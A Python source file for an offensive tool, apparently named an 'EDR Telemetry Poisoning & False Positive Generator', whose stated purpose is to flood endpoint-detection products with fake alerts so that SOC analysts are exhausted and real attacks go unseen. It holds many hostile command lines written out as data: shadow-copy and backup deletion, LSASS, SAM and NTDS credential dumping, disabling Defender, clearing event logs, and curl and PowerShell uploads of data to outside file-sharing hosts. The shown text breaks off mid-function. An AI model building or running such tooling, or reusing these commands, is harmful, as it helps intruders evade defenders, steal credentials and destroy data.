#!/usr/bin/env python3
"""
EDR Telemetry Poisoning & False Positive Generator
===================================================
Flood EDR solutions with false positives to exhaust SOC analysts
and hide real malicious activity in the noise.

Supported EDR Solutions:
- Microsoft Defender for Endpoint
- CrowdStrike Falcon
- SentinelOne
- Carbon Black
- Cortex XDR
- Elastic Security

Author: Shadow Arsenal Team
Version: 2.0.0
"""

import os
import sys
import json
import random
import string
import hashlib
import base64
import struct
import time
import threading
import subprocess
import tempfile
import shutil
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Generator
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class EDRVendor(Enum):
    """Supported EDR vendors"""
    DEFENDER = "microsoft_defender"
    CROWDSTRIKE = "crowdstrike_falcon"
    SENTINELONE = "sentinelone"
    CARBON_BLACK = "carbon_black"
    CORTEX_XDR = "cortex_xdr"
    ELASTIC = "elastic_security"
    GENERIC = "generic"


class NoiseCategory(Enum):
    """Categories of false positive noise"""
    RANSOMWARE_SIM = "ransomware_simulation"
    CREDENTIAL_ACCESS = "credential_access"
    LATERAL_MOVEMENT = "lateral_movement"
    PERSISTENCE = "persistence"
    EXFILTRATION = "exfiltration"
    PROCESS_INJECTION = "process_injection"
    DEFENSE_EVASION = "defense_evasion"
    DISCOVERY = "discovery"
    EXECUTION = "execution"
    COMMAND_CONTROL = "command_and_control"


class IntensityLevel(Enum):
    """Noise intensity levels"""
    LOW = 1        # 10-50 events/minute
    MEDIUM = 2     # 50-200 events/minute
    HIGH = 3       # 200-500 events/minute
    EXTREME = 4    # 500+ events/minute (SOC killer)


@dataclass
class NoiseEvent:
    """Represents a single noise event"""
    event_id: str
    category: NoiseCategory
    timestamp: datetime
    process_name: str
    command_line: str
    parent_process: str
    target_file: Optional[str] = None
    target_registry: Optional[str] = None
    network_connection: Optional[Dict] = None
    severity: str = "medium"
    mitre_technique: str = ""
    description: str = ""
    
    def to_dict(self) -> Dict:
        return {
            "event_id": self.event_id,
            "category": self.category.value,
            "timestamp": self.timestamp.isoformat(),
            "process_name": self.process_name,
            "command_line": self.command_line,
            "parent_process": self.parent_process,
            "target_file": self.target_file,
            "target_registry": self.target_registry,
            "network_connection": self.network_connection,
            "severity": self.severity,
            "mitre_technique": self.mitre_technique,
            "description": self.description
        }


@dataclass
class PoisonCampaign:
    """EDR poisoning campaign configuration"""
    campaign_id: str
    name: str
    target_edr: EDRVendor
    intensity: IntensityLevel
    categories: List[NoiseCategory]
    duration_minutes: int
    start_time: datetime = field(default_factory=datetime.now)
    events_generated: int = 0
    status: str = "pending"
    
    def to_dict(self) -> Dict:
        return {
            "campaign_id": self.campaign_id,
            "name": self.name,
            "target_edr": self.target_edr.value,
            "intensity": self.intensity.name,
            "categories": [c.value for c in self.categories],
            "duration_minutes": self.duration_minutes,
            "start_time": self.start_time.isoformat(),
            "events_generated": self.events_generated,
            "status": self.status
        }


# ============================================================================
# EDR-Specific Noise Patterns
# ============================================================================

class EDRNoisePatterns:
    """EDR-specific telemetry patterns that trigger alerts"""
    
    # Microsoft Defender patterns
    DEFENDER_TRIGGERS = {
        "ransomware": [
            {"process": "vssadmin.exe", "args": "delete shadows /all /quiet"},
            {"process": "wmic.exe", "args": "shadowcopy delete"},
            {"process": "bcdedit.exe", "args": "/set {default} recoveryenabled no"},
            {"process": "wbadmin.exe", "args": "delete catalog -quiet"},
            {"process": "cipher.exe", "args": "/w:C:\\"},
        ],
        "credential_access": [
            {"process": "rundll32.exe", "args": "comsvcs.dll,MiniDump"},
            {"process": "procdump.exe", "args": "-ma lsass.exe"},
            {"process": "mimikatz.exe", "args": "sekurlsa::logonpasswords"},
            {"process": "reg.exe", "args": "save HKLM\\SAM"},
            {"process": "ntdsutil.exe", "args": "ac i ntds ifm create full"},
        ],
        "lateral_movement": [
            {"process": "psexec.exe", "args": "-accepteula \\\\target cmd"},
            {"process": "wmic.exe", "args": "/node:target process call create"},
            {"process": "schtasks.exe", "args": "/create /s target /tn task"},
            {"process": "winrs.exe", "args": "-r:target cmd"},
            {"process": "mstsc.exe", "args": "/v:target"},
        ],
        "persistence": [
            {"process": "reg.exe", "args": "add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"},
            {"process": "schtasks.exe", "args": "/create /sc onlogon"},
            {"process": "sc.exe", "args": "create malservice binpath="},
            {"process": "netsh.exe", "args": "advfirewall firewall add rule"},
        ],
    }
    
    # CrowdStrike Falcon patterns
    CROWDSTRIKE_TRIGGERS = {
        "ransomware": [
            {"process": "cmd.exe", "args": "/c vssadmin.exe delete shadows"},
            {"process": "powershell.exe", "args": "Get-WmiObject Win32_ShadowCopy | Remove-WmiObject"},
            {"process": "wmic.exe", "args": "shadowcopy delete /nointeractive"},
        ],
        "credential_access": [
            {"process": "powershell.exe", "args": "[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR"},
            {"process": "certutil.exe", "args": "-urlcache -split -f"},
            {"process": "rundll32.exe", "args": "C:\\Windows\\System32\\comsvcs.dll MiniDump"},
        ],
        "process_injection": [
            {"process": "powershell.exe", "args": "[System.Reflection.Assembly]::Load"},
            {"process": "rundll32.exe", "args": "javascript:"},
            {"process": "mshta.exe", "args": "vbscript:Execute"},
        ],
    }
    
    # SentinelOne patterns
    SENTINELONE_TRIGGERS = {
        "ransomware": [
            {"process": "cmd.exe", "args": "bcdedit /set {default} bootstatuspolicy ignoreallfailures"},
            {"process": "powershell.exe", "args": "Remove-Item -Path 'C:\\Windows\\System32\\config\\RegBack'"},
        ],
        "credential_access": [
            {"process": "powershell.exe", "args": "Get-Process lsass | Out-File"},
            {"process": "taskmgr.exe", "args": "/dump lsass.exe"},
        ],
        "defense_evasion": [
            {"process": "powershell.exe", "args": "Set-MpPreference -DisableRealtimeMonitoring $true"},
            {"process": "sc.exe", "args": "stop WinDefend"},
            {"process": "reg.exe", "args": "add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware"},
        ],
    }
    
    # Common MITRE ATT&CK mappings
    MITRE_MAPPINGS = {
        NoiseCategory.RANSOMWARE_SIM: ["T1486", "T1490", "T1491"],
        NoiseCategory.CREDENTIAL_ACCESS: ["T1003", "T1558", "T1552", "T1555"],
        NoiseCategory.LATERAL_MOVEMENT: ["T1021", "T1570", "T1563"],
        NoiseCategory.PERSISTENCE: ["T1547", "T1053", "T1543"],
        NoiseCategory.EXFILTRATION: ["T1041", "T1048", "T1567"],
        NoiseCategory.PROCESS_INJECTION: ["T1055", "T1574"],
        NoiseCategory.DEFENSE_EVASION: ["T1562", "T1070", "T1027"],
        NoiseCategory.DISCOVERY: ["T1087", "T1082", "T1083"],
        NoiseCategory.EXECUTION: ["T1059", "T1204", "T1106"],
        NoiseCategory.COMMAND_CONTROL: ["T1071", "T1095", "T1572"],
    }


# ============================================================================
# Fake Activity Generators
# ============================================================================

class RansomwareSimulator:
    """Generate fake ransomware activity telemetry"""
    
    RANSOM_EXTENSIONS = [".encrypted", ".locked", ".crypted", ".enc", ".aes", 
                        ".rsa", ".zepto", ".locky", ".cerber", ".dharma"]
    
    RANSOM_NOTE_NAMES = ["README.txt", "HOW_TO_DECRYPT.txt", "DECRYPT_INSTRUCTIONS.html",
                        "RECOVERY.txt", "!READ_ME!.txt", "HELP_DECRYPT.txt"]
    
    @staticmethod
    def generate_vss_deletion_noise() -> List[Dict]:
        """Generate Volume Shadow Copy deletion noise"""
        events = []
        
        # Multiple VSS deletion methods
        vss_commands = [
            ("vssadmin.exe", "delete shadows /all /quiet"),
            ("vssadmin.exe", "resize shadowstorage /for=C: /on=C: /maxsize=401MB"),
            ("wmic.exe", "shadowcopy delete"),
            ("wmic.exe", "shadowcopy list brief"),
            ("powershell.exe", "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"),
            ("cmd.exe", "/c vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled no"),
        ]
        
        for proc, args in vss_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": random.choice(["explorer.exe", "cmd.exe", "powershell.exe"]),
                "mitre": "T1490",
                "severity": "critical",
                "description": "Shadow copy deletion - ransomware indicator"
            })
        
        return events
    
    @staticmethod
    def generate_encryption_noise(target_dirs: List[str] = None) -> List[Dict]:
        """Generate file encryption activity noise"""
        if not target_dirs:
            target_dirs = [
                "C:\\Users\\*\\Documents",
                "C:\\Users\\*\\Desktop",
                "C:\\Users\\*\\Pictures",
                "D:\\Shared",
                "E:\\Backups"
            ]
        
        events = []
        
        for _ in range(random.randint(50, 200)):
            original_ext = random.choice([".docx", ".xlsx", ".pdf", ".jpg", ".pptx"])
            ransom_ext = random.choice(RansomwareSimulator.RANSOM_EXTENSIONS)
            target_dir = random.choice(target_dirs)
            filename = ''.join(random.choices(string.ascii_lowercase, k=8))
            
            events.append({
                "type": "file_modify",
                "original_file": f"{target_dir}\\{filename}{original_ext}",
                "new_file": f"{target_dir}\\{filename}{original_ext}{ransom_ext}",
                "process": random.choice(["svchost.exe", "rundll32.exe", "conhost.exe"]),
                "mitre": "T1486",
                "severity": "critical",
                "description": "File encryption activity detected"
            })
        
        # Add ransom note creation
        for note_name in random.sample(RansomwareSimulator.RANSOM_NOTE_NAMES, 3):
            events.append({
                "type": "file_create",
                "file_path": f"C:\\Users\\Public\\{note_name}",
                "process": "notepad.exe",
                "mitre": "T1486",
                "severity": "critical",
                "description": "Ransom note creation"
            })
        
        return events
    
    @staticmethod
    def generate_recovery_disable_noise() -> List[Dict]:
        """Generate Windows recovery disabling noise"""
        events = []
        
        recovery_commands = [
            ("bcdedit.exe", "/set {default} recoveryenabled no"),
            ("bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures"),
            ("wbadmin.exe", "delete catalog -quiet"),
            ("wbadmin.exe", "delete systemstatebackup -keepversions:0"),
            ("cmd.exe", "/c rd /s /q C:\\Windows\\System32\\config\\RegBack"),
        ]
        
        for proc, args in recovery_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": "cmd.exe",
                "mitre": "T1490",
                "severity": "critical",
                "description": "System recovery disabled - ransomware indicator"
            })
        
        return events


class CredentialAccessSimulator:
    """Generate fake credential access telemetry"""
    
    @staticmethod
    def generate_lsass_access_noise() -> List[Dict]:
        """Generate LSASS memory access noise"""
        events = []
        
        # Various LSASS dump methods
        lsass_commands = [
            ("procdump.exe", "-ma lsass.exe lsass.dmp"),
            ("procdump64.exe", "-accepteula -ma lsass.exe"),
            ("rundll32.exe", "C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full"),
            ("taskmgr.exe", "/dump lsass.exe"),
            ("powershell.exe", "Get-Process lsass | Out-File lsass_info.txt"),
            ("mimikatz.exe", "privilege::debug sekurlsa::logonpasswords exit"),
            ("cmd.exe", "/c procdump -accepteula -ma lsass.exe lsass.dmp"),
        ]
        
        for proc, args in lsass_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": random.choice(["cmd.exe", "powershell.exe", "explorer.exe"]),
                "mitre": "T1003.001",
                "severity": "critical",
                "description": "LSASS memory access - credential theft indicator"
            })
        
        # Add handle access to LSASS
        for _ in range(10):
            events.append({
                "type": "process_access",
                "target_process": "lsass.exe",
                "source_process": random.choice(["unknown.exe", "svchost.exe", "rundll32.exe"]),
                "access_mask": "0x1FFFFF",
                "mitre": "T1003.001",
                "severity": "high",
                "description": "Process accessed LSASS with suspicious permissions"
            })
        
        return events
    
    @staticmethod
    def generate_sam_dump_noise() -> List[Dict]:
        """Generate SAM/SECURITY/SYSTEM hive dump noise"""
        events = []
        
        reg_commands = [
            ("reg.exe", "save HKLM\\SAM C:\\temp\\sam.hiv"),
            ("reg.exe", "save HKLM\\SECURITY C:\\temp\\security.hiv"),
            ("reg.exe", "save HKLM\\SYSTEM C:\\temp\\system.hiv"),
            ("cmd.exe", "/c reg save HKLM\\SAM sam.save"),
            ("powershell.exe", "Copy-Item C:\\Windows\\System32\\config\\SAM C:\\temp\\"),
        ]
        
        for proc, args in reg_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": "cmd.exe",
                "mitre": "T1003.002",
                "severity": "critical",
                "description": "SAM database extraction attempt"
            })
        
        return events
    
    @staticmethod
    def generate_ntds_dump_noise() -> List[Dict]:
        """Generate NTDS.dit dump noise (AD credential theft)"""
        events = []
        
        ntds_commands = [
            ("ntdsutil.exe", "ac i ntds ifm create full C:\\temp"),
            ("ntdsutil.exe", "\"activate instance ntds\" \"ifm\" \"create full c:\\temp\""),
            ("vssadmin.exe", "create shadow /for=C:"),
            ("cmd.exe", "/c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp"),
            ("powershell.exe", "Invoke-NinjaCopy -Path C:\\Windows\\NTDS\\NTDS.dit -LocalDestination C:\\temp"),
        ]
        
        for proc, args in ntds_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": random.choice(["cmd.exe", "powershell.exe"]),
                "mitre": "T1003.003",
                "severity": "critical",
                "description": "NTDS.dit extraction - domain credential theft"
            })
        
        return events
    
    @staticmethod
    def generate_kerberos_attack_noise() -> List[Dict]:
        """Generate Kerberoasting and AS-REP roasting noise"""
        events = []
        
        kerberos_commands = [
            ("powershell.exe", "Get-ADUser -Filter {ServicePrincipalName -ne '$null'}"),
            ("powershell.exe", "Invoke-Kerberoast -OutputFormat Hashcat"),
            ("Rubeus.exe", "kerberoast /outfile:hashes.txt"),
            ("Rubeus.exe", "asreproast /format:hashcat"),
            ("powershell.exe", "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}"),
            ("setspn.exe", "-T domain.local -Q */*"),
        ]
        
        for proc, args in kerberos_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": "powershell.exe",
                "mitre": "T1558.003",
                "severity": "high",
                "description": "Kerberos ticket attack attempt"
            })
        
        return events


class LateralMovementSimulator:
    """Generate fake lateral movement telemetry"""
    
    @staticmethod
    def generate_psexec_noise(targets: List[str] = None) -> List[Dict]:
        """Generate PsExec lateral movement noise"""
        if not targets:
            targets = [f"192.168.1.{i}" for i in range(10, 50)]
        
        events = []
        
        for target in random.sample(targets, min(20, len(targets))):
            psexec_variants = [
                ("psexec.exe", f"-accepteula \\\\{target} cmd.exe"),
                ("psexec64.exe", f"-s \\\\{target} powershell.exe"),
                ("paexec.exe", f"\\\\{target} -u admin -p pass cmd"),
            ]
            
            proc, args = random.choice(psexec_variants)
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": "cmd.exe",
                "network": {"destination": target, "port": 445},
                "mitre": "T1570",
                "severity": "high",
                "description": f"PsExec lateral movement to {target}"
            })
        
        return events
    
    @staticmethod
    def generate_wmi_lateral_noise(targets: List[str] = None) -> List[Dict]:
        """Generate WMI lateral movement noise"""
        if not targets:
            targets = [f"10.0.0.{i}" for i in range(1, 30)]
        
        events = []
        
        for target in random.sample(targets, min(15, len(targets))):
            wmi_commands = [
                f"/node:{target} process call create 'cmd.exe /c whoami'",
                f"/node:{target} process call create 'powershell -enc JABX...'",
                f"/node:{target} os get caption",
            ]
            
            for args in wmi_commands[:random.randint(1, 3)]:
                events.append({
                    "type": "process_create",
                    "process": "wmic.exe",
                    "command_line": f"wmic.exe {args}",
                    "parent": "cmd.exe",
                    "network": {"destination": target, "port": 135},
                    "mitre": "T1047",
                    "severity": "high",
                    "description": f"WMI lateral movement to {target}"
                })
        
        return events
    
    @staticmethod
    def generate_rdp_lateral_noise(targets: List[str] = None) -> List[Dict]:
        """Generate RDP lateral movement noise"""
        if not targets:
            targets = ["DC01", "FILESERVER", "SQLSERVER", "WEBSERVER"]
        
        events = []
        
        for target in targets:
            events.append({
                "type": "network_connection",
                "process": "mstsc.exe",
                "destination": target,
                "port": 3389,
                "mitre": "T1021.001",
                "severity": "medium",
                "description": f"RDP connection to {target}"
            })
            
            # Add clipboard/drive sharing
            events.append({
                "type": "rdp_feature",
                "feature": random.choice(["clipboard_shared", "drive_shared", "printer_shared"]),
                "target": target,
                "mitre": "T1021.001",
                "severity": "medium",
                "description": "RDP resource sharing enabled"
            })
        
        return events


class PersistenceSimulator:
    """Generate fake persistence mechanism telemetry"""
    
    @staticmethod
    def generate_registry_persistence_noise() -> List[Dict]:
        """Generate registry-based persistence noise"""
        events = []
        
        registry_keys = [
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            r"HKLM\SYSTEM\CurrentControlSet\Services",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
        ]
        
        for reg_key in registry_keys:
            value_name = ''.join(random.choices(string.ascii_letters, k=8))
            events.append({
                "type": "registry_set",
                "registry_key": reg_key,
                "value_name": value_name,
                "value_data": f"C:\\Windows\\Temp\\{value_name}.exe",
                "process": random.choice(["reg.exe", "powershell.exe", "cmd.exe"]),
                "mitre": "T1547.001",
                "severity": "high",
                "description": "Registry persistence mechanism created"
            })
        
        return events
    
    @staticmethod
    def generate_scheduled_task_noise() -> List[Dict]:
        """Generate scheduled task persistence noise"""
        events = []
        
        task_commands = [
            "/create /tn 'WindowsUpdate' /tr 'C:\\Windows\\Temp\\update.exe' /sc onlogon",
            "/create /tn 'SystemCheck' /tr 'powershell -ep bypass -file C:\\temp\\check.ps1' /sc hourly",
            "/create /tn 'Maintenance' /tr 'cmd /c start /min C:\\temp\\maint.bat' /sc daily",
            "/create /tn 'BackupService' /tr 'C:\\ProgramData\\backup.exe' /sc onidle",
        ]
        
        for args in task_commands:
            events.append({
                "type": "process_create",
                "process": "schtasks.exe",
                "command_line": f"schtasks.exe {args}",
                "parent": "cmd.exe",
                "mitre": "T1053.005",
                "severity": "high",
                "description": "Scheduled task persistence created"
            })
        
        return events
    
    @staticmethod
    def generate_service_persistence_noise() -> List[Dict]:
        """Generate service-based persistence noise"""
        events = []
        
        service_names = ["WindowsUpdateSvc", "SystemHealthCheck", "NetLogonHelper", "WmiPrvSvc"]
        
        for svc_name in service_names:
            events.append({
                "type": "process_create",
                "process": "sc.exe",
                "command_line": f"sc.exe create {svc_name} binpath= C:\\Windows\\Temp\\{svc_name}.exe start= auto",
                "parent": "cmd.exe",
                "mitre": "T1543.003",
                "severity": "high",
                "description": f"Malicious service '{svc_name}' created"
            })
        
        return events


class DefenseEvasionSimulator:
    """Generate fake defense evasion telemetry"""
    
    @staticmethod
    def generate_av_disable_noise() -> List[Dict]:
        """Generate antivirus/EDR disable attempts"""
        events = []
        
        disable_commands = [
            ("powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true"),
            ("powershell.exe", "Set-MpPreference -DisableBehaviorMonitoring $true"),
            ("powershell.exe", "Set-MpPreference -DisableIOAVProtection $true"),
            ("sc.exe", "stop WinDefend"),
            ("sc.exe", "config WinDefend start= disabled"),
            ("net.exe", "stop 'Windows Defender Antivirus Service'"),
            ("reg.exe", "add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1"),
            ("powershell.exe", "Remove-MpPreference -ExclusionPath C:\\"),
            ("taskkill.exe", "/F /IM MsMpEng.exe"),
        ]
        
        for proc, args in disable_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": "cmd.exe",
                "mitre": "T1562.001",
                "severity": "critical",
                "description": "Attempt to disable security software"
            })
        
        return events
    
    @staticmethod
    def generate_log_clearing_noise() -> List[Dict]:
        """Generate event log clearing noise"""
        events = []
        
        log_commands = [
            ("wevtutil.exe", "cl Security"),
            ("wevtutil.exe", "cl System"),
            ("wevtutil.exe", "cl Application"),
            ("wevtutil.exe", "cl 'Windows PowerShell'"),
            ("powershell.exe", "Clear-EventLog -LogName Security"),
            ("powershell.exe", "Get-EventLog -List | ForEach { Clear-EventLog $_.Log }"),
            ("cmd.exe", "/c for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\""),
        ]
        
        for proc, args in log_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": "cmd.exe",
                "mitre": "T1070.001",
                "severity": "high",
                "description": "Event log clearing attempt"
            })
        
        return events
    
    @staticmethod
    def generate_timestomp_noise() -> List[Dict]:
        """Generate timestomping noise"""
        events = []
        
        timestomp_commands = [
            ("powershell.exe", "(Get-Item C:\\temp\\malware.exe).LastWriteTime = '01/01/2020 12:00:00'"),
            ("powershell.exe", "(Get-Item C:\\temp\\malware.exe).CreationTime = '01/01/2020 12:00:00'"),
            ("cmd.exe", "/c copy /b malware.exe +,, && attrib +h +s malware.exe"),
        ]
        
        for proc, args in timestomp_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": "powershell.exe",
                "mitre": "T1070.006",
                "severity": "medium",
                "description": "File timestomping detected"
            })
        
        return events


class ProcessInjectionSimulator:
    """Generate fake process injection telemetry"""
    
    @staticmethod
    def generate_injection_noise() -> List[Dict]:
        """Generate various process injection technique noise"""
        events = []
        
        # DLL Injection
        dll_injection = [
            ("powershell.exe", "[System.Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQ...'))"),
            ("rundll32.exe", "javascript:\"\\..\\mshtml,RunHTMLApplication\";"),
            ("mshta.exe", "vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run...\")"),
        ]
        
        for proc, args in dll_injection:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": "explorer.exe",
                "mitre": "T1055.001",
                "severity": "critical",
                "description": "DLL injection technique detected"
            })
        
        # Process Hollowing
        hollow_targets = ["svchost.exe", "notepad.exe", "calc.exe", "mspaint.exe"]
        for target in hollow_targets:
            events.append({
                "type": "process_tamper",
                "target_process": target,
                "technique": "process_hollowing",
                "source_process": "cmd.exe",
                "mitre": "T1055.012",
                "severity": "critical",
                "description": f"Process hollowing detected in {target}"
            })
        
        return events


class DiscoverySimulator:
    """Generate fake discovery/reconnaissance telemetry"""
    
    @staticmethod
    def generate_discovery_noise() -> List[Dict]:
        """Generate system discovery noise"""
        events = []
        
        discovery_commands = [
            ("whoami.exe", "/all"),
            ("net.exe", "user /domain"),
            ("net.exe", "group 'Domain Admins' /domain"),
            ("net.exe", "localgroup administrators"),
            ("nltest.exe", "/dclist:domain.local"),
            ("dsquery.exe", "computer -limit 0"),
            ("arp.exe", "-a"),
            ("netstat.exe", "-ano"),
            ("ipconfig.exe", "/all"),
            ("systeminfo.exe", ""),
            ("tasklist.exe", "/v"),
            ("qwinsta.exe", "/server:DC01"),
            ("nbtstat.exe", "-n"),
            ("route.exe", "print"),
            ("net.exe", "share"),
            ("net.exe", "view /domain"),
            ("powershell.exe", "Get-ADComputer -Filter *"),
            ("powershell.exe", "Get-ADUser -Filter * -Properties *"),
            ("powershell.exe", "Get-ADGroup -Filter *"),
            ("cmdkey.exe", "/list"),
        ]
        
        for proc, args in discovery_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}".strip(),
                "parent": random.choice(["cmd.exe", "powershell.exe"]),
                "mitre": random.choice(["T1087", "T1082", "T1083", "T1016", "T1049"]),
                "severity": "medium",
                "description": "System discovery/enumeration activity"
            })
        
        return events


class C2Simulator:
    """Generate fake C2 communication telemetry"""
    
    @staticmethod
    def generate_c2_noise() -> List[Dict]:
        """Generate command & control communication noise"""
        events = []
        
        # DNS beaconing
        for _ in range(20):
            subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
            events.append({
                "type": "dns_query",
                "query": f"{subdomain}.evil-domain.com",
                "query_type": "TXT",
                "process": "svchost.exe",
                "mitre": "T1071.004",
                "severity": "high",
                "description": "Suspicious DNS beaconing detected"
            })
        
        # HTTP/HTTPS beaconing
        c2_domains = ["cdn-update.com", "static-content.net", "api-service.io", "cloud-sync.com"]
        for domain in c2_domains:
            for _ in range(5):
                events.append({
                    "type": "network_connection",
                    "process": random.choice(["svchost.exe", "powershell.exe", "rundll32.exe"]),
                    "destination": domain,
                    "port": random.choice([80, 443, 8080, 8443]),
                    "mitre": "T1071.001",
                    "severity": "high",
                    "description": f"Potential C2 beaconing to {domain}"
                })
        
        # Named pipe communication
        pipe_names = ["\\\\.\\pipe\\MSSE-1234-server", "\\\\.\\pipe\\msagent_fedcba"]
        for pipe in pipe_names:
            events.append({
                "type": "named_pipe",
                "pipe_name": pipe,
                "process": "svchost.exe",
                "mitre": "T1572",
                "severity": "high",
                "description": "Suspicious named pipe communication"
            })
        
        return events


class ExfiltrationSimulator:
    """Generate fake data exfiltration telemetry"""
    
    @staticmethod
    def generate_exfil_noise() -> List[Dict]:
        """Generate data exfiltration noise"""
        events = []
        
        # Archive creation
        archive_commands = [
            ("7z.exe", "a -p archive.7z C:\\Users\\*\\Documents\\*"),
            ("rar.exe", "a -hp secret.rar C:\\Confidential\\*"),
            ("powershell.exe", "Compress-Archive -Path C:\\Sensitive -DestinationPath C:\\temp\\data.zip"),
            ("tar.exe", "-cvf backup.tar C:\\ImportantData"),
        ]
        
        for proc, args in archive_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": "cmd.exe",
                "mitre": "T1560.001",
                "severity": "high",
                "description": "Data staging for exfiltration"
            })
        
        # Cloud upload
        cloud_commands = [
            ("rclone.exe", "copy C:\\temp\\data.zip remote:exfil/"),
            ("curl.exe", "-X POST -F 'file=@data.zip' https://file.io"),
            ("powershell.exe", "Invoke-WebRequest -Uri https://transfer.sh -Method PUT -InFile data.zip"),
        ]
        
        for proc, args in cloud_commands:
            events.append({
                "type": "process_create",
                "process": proc,
                "command_line": f"{proc} {args}",
                "parent": "cmd.exe",
                "mitre": "T1567",
                "severity": "critical",
                "description": "Data exfiltration to cloud service"
            })
        
        # Large outbound transfer
        for _ in range(10):
            events.append({
                "type": "network_transfer",
                "process": "svchost.exe",
                "destination": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "bytes_sent": random.randint(10000000, 100000000),
                "port": random.choice([443, 22, 21, 8080]),
                "mitre": "T1048",
                "severity": "high",
                "description": "Large outbound data transfer"
            })
        
        return events


# ============================================================================
# AI-Powered Noise Generator
# ============================================================================

class AINoiseOrchestrator:
    """AI-powered noise generation to hide real attack chains"""
    
    def __init__(self):
        self.simulators = {
            NoiseCategory.RANSOMWARE_SIM: RansomwareSimulator,
            NoiseCategory.CREDENTIAL_ACCESS: CredentialAccessSimulator,
            NoiseCategory.LATERAL_MOVEMENT: LateralMovementSimulator,
            NoiseCategory.PERSISTENCE: PersistenceSimulator,
            NoiseCategory.DEFENSE_EVASION: DefenseEvasionSimulator,
            NoiseCategory.PROCESS_INJECTION: ProcessInjectionSimulator,
            NoiseCategory.DISCOVERY: DiscoverySimulator,
            NoiseCategory.COMMAND_CONTROL: C2Simulator,
            NoiseCategory.EXFILTRATION: ExfiltrationSimulator,
        }
        self.event_counter = 0
    
    def generate_noise_burst(
        self,
        categories: List[NoiseCategory],
        intensity: IntensityLevel,
        target_edr: EDRVendor = EDRVendor.GENERIC
    ) -> List[NoiseEvent]:
        """Generate a burst of noise events"""
        events = []
        
        # Calculate event count based on intensity
        event_counts = {
            IntensityLevel.LOW: random.randint(10, 50),
            IntensityLevel.MEDIUM: random.randint(50, 200),
            IntensityLevel.HIGH: random.randint(200, 500),
            IntensityLevel.EXTREME: random.randint(500, 1000),
        }
        
        target_count = event_counts[intensity]
        
        for category in categories:
            simulator = self.simulators.get(category)
            if not simulator:
                continue
            
            # Generate category-specific events
            if category == NoiseCategory.RANSOMWARE_SIM:
                raw_events = (
                    simulator.generate_vss_deletion_noise() +
                    simulator.generate_encryption_noise() +
                    simulator.generate_recovery_disable_noise()
                )
            elif category == NoiseCategory.CREDENTIAL_ACCESS:
                raw_events = (
                    simulator.generate_lsass_access_noise() +
                    simulator.generate_sam_dump_noise() +
                    simulator.generate_ntds_dump_noise() +
                    simulator.generate_kerberos_attack_noise()
                )
            elif category == NoiseCategory.LATERAL_MOVEMENT:
                raw_events = (
                    simulator.generate_psexec_noise() +
                    simulator.generate_wmi_lateral_noise() +
                    simulator.generate_rdp_lateral_noise()
                )
            elif category == NoiseCategory.PERSISTENCE:
                raw_events = (
                    simulator.generate_registry_persistence_noise() +
                    simulator.generate_scheduled_task_noise() +
                    simulator.generate_service_persistence_noise()
                )
            elif category == NoiseCategory.DEFENSE_EVASION:
                raw_events = (
                    simulator.generate_av_disable_noise() +
                    simulator.generate_log_clearing_noise() +
                    simulator.generate_timestomp_noise()
                )
            elif category == NoiseCategory.PROCESS_INJECTION:
                raw_events = simulator.generate_injection_noise()
            elif category == NoiseCategory.DISCOVERY:
                raw_events = simulator.generate_discovery_noise()
            elif category == NoiseCategory.COMMAND_CONTROL:
                raw_events = simulator.generate_c2_noise()
            elif category == NoiseCategory.EXFILTRATION:
                raw_events = simulator.generate_exfil_noise()
            else:
                raw_events = []
            
            # Convert to NoiseEvent objects
            for raw_event in raw_events:
                self.event_counter += 1
                event = NoiseEvent(
                    event_id=f"NOISE-{self.event_counter:06d}",
                    category=category,
